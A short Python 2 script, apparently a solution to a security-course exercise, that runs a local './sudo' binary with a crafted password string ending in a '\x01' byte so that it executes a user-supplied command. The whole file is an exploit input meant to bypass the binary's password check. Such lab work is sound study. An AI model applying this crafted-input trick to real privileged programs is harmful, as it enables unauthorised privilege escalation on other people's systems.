import os, sys


PATH_TO_SUDO = './sudo'


def run_command(cmd):
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO ,"123456789" + "\x01", cmd);
    #raise NotImplementedError()


def main(argv):
    if not len(argv) == 2:
        print 'Usage: %s <command>' % argv[0]
        sys.exit(1)

    cmd = argv[1]
    run_command(cmd)


if __name__ == '__main__':
    main(sys.argv)
